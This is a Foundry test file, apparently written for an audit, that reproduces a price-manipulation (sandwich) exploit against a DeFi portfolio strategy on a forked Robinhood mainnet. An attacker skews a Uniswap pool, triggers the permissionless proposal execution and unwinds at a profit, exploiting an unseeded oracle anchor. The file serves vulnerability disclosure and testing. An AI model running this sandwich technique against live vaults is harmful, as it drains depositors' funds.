// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {console2} from "forge-std/Test.sol";
import {RobinhoodMainnetIntegrationTest} from "../integration/RobinhoodMainnetIntegrationTest.sol";
import {ISyndicateGovernor} from "../../src/interfaces/ISyndicateGovernor.sol";
import {PortfolioStrategy} from "../../src/strategies/PortfolioStrategy.sol";
import {UniswapSwapAdapter} from "../../src/adapters/UniswapSwapAdapter.sol";
import {TierRegistry} from "../../src/TierRegistry.sol";
import {BatchExecutorLib} from "../../src/BatchExecutorLib.sol";
import {ERC20Mock} from "../mocks/ERC20Mock.sol";
import {GovEnvelope} from "../helpers/GovEnvelope.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISwapRouter02 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
}

interface IQuoterV2 {
    struct QuoteExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint256 amountIn;
        uint24 fee;
        uint160 sqrtPriceLimitX96;
    }

    function quoteExactInputSingle(QuoteExactInputSingleParams memory params)
        external
        returns (uint256 amountOut, uint160 sqrtPriceX96After, uint32 initializedTicksCrossed, uint256 gasEstimate);
}

/**
 * @title Finding #3 PoC — Data Streams anchor unseeded at first trade
 * @notice Reproduces the critical from the pashov-skill audit: in Data Streams
 *         mode `_lastGoodPrice[i]` is written ONLY by `rebalanceDelta`, which
 *         cannot run before `_execute()`, so at the strategy's first (and
 *         largest) trade the oracle anchor is provably zero and `_buyFloor`
 *         falls through to `_quoteMinOut` — a quote taken against the SAME pool
 *         the swap crosses, and `executeProposal` is permissionless.
 *
 *         The test runs the identical Approved proposal twice from the same
 *         pre-execute snapshot:
 *           CONTROL — execute with the pool untouched  → W_fair WETH received.
 *           ATTACK  — attacker pushes the USDG/WETH pool, then executes, then
 *                     unwinds → W_manip WETH received, and attacker net USDG.
 *
 *         W_manip << W_fair proves the floor tracked the manipulated quote
 *         rather than a fair price; attacker profit proves it is extraction,
 *         not merely a worse fill.
 *
 * @dev Forks Robinhood mainnet at `latest` (the public RPC is not archival, so
 *      the base harness's pinned block is unavailable). Run:
 *        ROBINHOOD_RPC_URL=https://rpc.mainnet.chain.robinhood.com \
 *        forge test --match-path "test/pocs/Finding3_DataStreamsAnchorSandwich.t.sol" -vv
 */
contract Finding3DataStreamsAnchorSandwich is RobinhoodMainnetIntegrationTest {
    uint256 constant TOTAL_AMOUNT = 5_000e6; // 5,000 USDG allocation (100% WETH)
    uint256 constant STRATEGY_DURATION = 1 hours;
    uint256 constant PERF_FEE_BPS = 1000;
    uint256 constant MAX_SLIPPAGE_BPS = 500; // 5%

    // Nonzero verifier => Data Streams mode. Never CALLED during execute (no
    // report is passed at execute time), only allowlisted, so a dummy address
    // is faithful to the exploit precondition.
    address constant DS_VERIFIER = address(uint160(0xD5D5D5D5D5D5));
    bytes32 constant DS_FEED_ID = bytes32(uint256(0xABCDEF)); // opaque DS feed id

    address swapAdapter;
    address template;
    address attacker = makeAddr("attacker");

    // Override setUp: fork at latest (public RPC prunes the base's pinned block)
    // and reuse the base's internal deploy helpers verbatim.
    function setUp() public override {
        string memory rpc = vm.envOr("ROBINHOOD_RPC_URL", string(""));
        if (bytes(rpc).length == 0) {
            vm.skip(true);
            return;
        }
        vm.createSelectFork(rpc); // latest
        require(block.chainid == 4663, "not on Robinhood mainnet fork");

        wood = new ERC20Mock("Wood", "WOOD", 18);
        _deployProtocol();
        _bondOwnerStake();
        _createSyndicate();
        _fundAndDeposit(10_000e6, 10_000e6);
        vm.warp(vm.getBlockTimestamp() + 1);

        swapAdapter =
            address(new UniswapSwapAdapter(UNISWAP_SWAP_ROUTER, UNISWAP_QUOTER_V2, V4_POOL_MANAGER, V4_QUOTER));
        template = address(new PortfolioStrategy());

        vm.startPrank(deployer);
        TierRegistry(tierRegistry).setAdapterAllowed(swapAdapter, true);
        TierRegistry(tierRegistry).setAdapterAllowed(DS_VERIFIER, true); // verifier as price source
        TierRegistry(tierRegistry).setPriceSourceForToken(WETH, DS_FEED_ID, true); // DS pairing
        vm.stopPrank();
    }

    function _buildDsWethInitData(uint256 totalAmt) internal view returns (bytes memory) {
        address[] memory tokens = new address[](1);
        tokens[0] = WETH;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 10_000;
        bytes[] memory extraData = new bytes[](1);
        extraData[0] = abi.encodePacked(uint8(0), abi.encode(FEE_500)); // v3 single-hop, fee 500
        uint8[] memory priceDecimals = new uint8[](1);
        priceDecimals[0] = 8;
        bytes32[] memory feedIds = new bytes32[](1);
        feedIds[0] = DS_FEED_ID; // DS mode: opaque 32-byte feed id

        return abi.encode(
            USDG,
            swapAdapter,
            DS_VERIFIER, // <-- Data Streams mode
            tokens,
            weights,
            totalAmt,
            MAX_SLIPPAGE_BPS,
            extraData,
            priceDecimals,
            feedIds
        );
    }

    function _buildExecCalls(address strategy, uint256 amount)
        internal
        pure
        returns (BatchExecutorLib.Call[] memory calls)
    {
        calls = new BatchExecutorLib.Call[](2);
        calls[0] =
            BatchExecutorLib.Call({target: USDG, data: abi.encodeCall(IERC20.approve, (strategy, amount)), value: 0});
        calls[1] = BatchExecutorLib.Call({target: strategy, data: abi.encodeWithSignature("execute()"), value: 0});
    }

    function _buildSettleCalls(address strategy) internal pure returns (BatchExecutorLib.Call[] memory calls) {
        calls = new BatchExecutorLib.Call[](1);
        calls[0] = BatchExecutorLib.Call({target: strategy, data: abi.encodeWithSignature("settle()"), value: 0});
    }

    // propose → vote → review, STOPPING BEFORE execute (so we can execute twice
    // from a snapshot). Mirrors the base harness's _proposeVoteExecute minus the
    // final executeProposal call.
    function _proposeVoteApprove(address strategy) internal returns (uint256 proposalId) {
        vm.prank(owner);
        vault.setAgentFeeBps(PERF_FEE_BPS);

        BatchExecutorLib.Call[] memory execCalls = _buildExecCalls(strategy, TOTAL_AMOUNT);
        BatchExecutorLib.Call[] memory settleCalls = _buildSettleCalls(strategy);

        uint256 maxCapital = GovEnvelope.permissive(address(vault)).maxCapital;
        uint256[] memory execCaps = new uint256[](execCalls.length);
        execCaps[execCalls.length - 1] = maxCapital; // mover is the LAST call

        vm.prank(agent);
        proposalId = governor.propose(
            address(vault),
            strategy, // issue #150: proposal must declare THIS clone as its strategy
            "ipfs://finding3-poc",
            STRATEGY_DURATION,
            GovEnvelope.permissive(address(vault)),
            execCalls,
            execCaps,
            settleCalls,
            GovEnvelope.defaultCaps(maxCapital, settleCalls.length),
            _emptyCoProposers()
        );

        vm.warp(vm.getBlockTimestamp() + 1);
        vm.prank(lp1);
        governor.vote(proposalId, ISyndicateGovernor.VoteType.For);
        vm.prank(lp2);
        governor.vote(proposalId, ISyndicateGovernor.VoteType.For);

        ISyndicateGovernor.GovernorParams memory params = governor.getGovernorParams();
        vm.warp(vm.getBlockTimestamp() + params.votingPeriod + 1);

        registry.openReview(address(governor), proposalId);
        uint256 reviewPeriod = registry.reviewPeriod();
        vm.warp(vm.getBlockTimestamp() + reviewPeriod + 1);
        registry.resolveReview(address(governor), proposalId);
    }

    function test_finding3_dataStreamsAnchorSandwich() public {
        address strategy = _cloneAndInit(template, _buildDsWethInitData(TOTAL_AMOUNT));
        uint256 proposalId = _proposeVoteApprove(strategy);

        // ── Fair reference: what 5,000 USDG buys at the UNTOUCHED pool ──
        (uint256 wFair,,,) = IQuoterV2(UNISWAP_QUOTER_V2).quoteExactInputSingle(
            IQuoterV2.QuoteExactInputSingleParams({
                tokenIn: USDG,
                tokenOut: WETH,
                amountIn: TOTAL_AMOUNT,
                fee: FEE_500,
                sqrtPriceLimitX96: 0
            })
        );
        console2.log("FAIR quote: WETH for 5,000 USDG:       ", wFair);
        require(wFair > 0, "fair quote produced no WETH");

        // ── ATTACK: attacker pushes the USDG/WETH pool, then executes ──
        // Give the attacker a war chest and push WETH's price UP (buy WETH with
        // USDG) so the strategy's subsequent buy fills at an inflated price.
        uint256 pushUsdg = 3_000_000e6; // 3M USDG shove
        deal(USDG, attacker, pushUsdg);

        uint256 attackerUsdgStart = pushUsdg;
        vm.startPrank(attacker);
        IERC20(USDG).approve(UNISWAP_SWAP_ROUTER, type(uint256).max);
        uint256 wethBought = ISwapRouter02(UNISWAP_SWAP_ROUTER).exactInputSingle(
            ISwapRouter02.ExactInputSingleParams({
                tokenIn: USDG,
                tokenOut: WETH,
                fee: FEE_500,
                recipient: attacker,
                amountIn: pushUsdg,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
        vm.stopPrank();
        console2.log("Attacker WETH bought (pool push):      ", wethBought);

        // Permissionless execute — anyone can trigger it, here the attacker does.
        vm.prank(attacker);
        governor.executeProposal(proposalId);
        uint256 wManip = IERC20(WETH).balanceOf(strategy);
        console2.log("ATTACK   WETH received (pushed pool):  ", wManip);

        // Attacker unwinds: sell all WETH back to USDG.
        vm.startPrank(attacker);
        IERC20(WETH).approve(UNISWAP_SWAP_ROUTER, type(uint256).max);
        uint256 usdgBack = ISwapRouter02(UNISWAP_SWAP_ROUTER).exactInputSingle(
            ISwapRouter02.ExactInputSingleParams({
                tokenIn: WETH,
                tokenOut: USDG,
                fee: FEE_500,
                recipient: attacker,
                amountIn: IERC20(WETH).balanceOf(attacker),
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
        vm.stopPrank();

        uint256 attackerUsdgEnd = IERC20(USDG).balanceOf(attacker);
        console2.log("Attacker USDG start:                   ", attackerUsdgStart);
        console2.log("Attacker USDG end:                     ", attackerUsdgEnd);

        // ── Assertions ──
        // 1) The DS-mode floor failed to protect: the strategy received far less
        //    WETH from the pushed pool than the fair pool would have given for
        //    the same 5,000 USDG, yet execute did NOT revert.
        console2.log("W_fair / W_manip ratio (x):            ", wFair / (wManip == 0 ? 1 : wManip));
        assertLt(wManip * 2, wFair, "expected the pushed-pool fill to be far worse than fair");

        // 2) It is extraction, not just a bad fill: the attacker's round-trip
        //    netted a profit funded by the vault's inflated buy.
        if (attackerUsdgEnd > attackerUsdgStart) {
            console2.log("ATTACKER NET PROFIT (USDG):            ", attackerUsdgEnd - attackerUsdgStart);
        } else {
            console2.log("attacker net loss (USDG):              ", attackerUsdgStart - attackerUsdgEnd);
        }
        assertGt(attackerUsdgEnd, attackerUsdgStart, "attacker sandwich must be profitable");
    }
}
